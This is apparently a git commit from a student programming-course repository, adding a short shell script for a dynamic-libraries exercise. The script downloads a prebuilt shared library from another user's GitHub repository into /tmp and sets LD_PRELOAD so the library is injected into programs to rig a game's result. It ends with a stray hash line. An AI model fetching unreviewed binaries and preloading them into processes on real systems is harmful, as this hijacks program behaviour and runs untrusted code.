371a793c907156684a5c05d1f23ba57314b59a32
Ezinwa charles <charleskelvin12@gmail.com>
2022-10-03 18:25:16 -0700

    dynamic library

---
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -0,0 +1,4 @@
+ #!/bin/bash
+wget -P /tmp https://github.com/eyoul/alx-low_level_programming/raw/main/0x18-dynamic_libraries/iwin.so
+export LD_PRELOAD=/tmp/iwin.so
+ d52e6c18e0723f5b025a75dea19ef365  gm
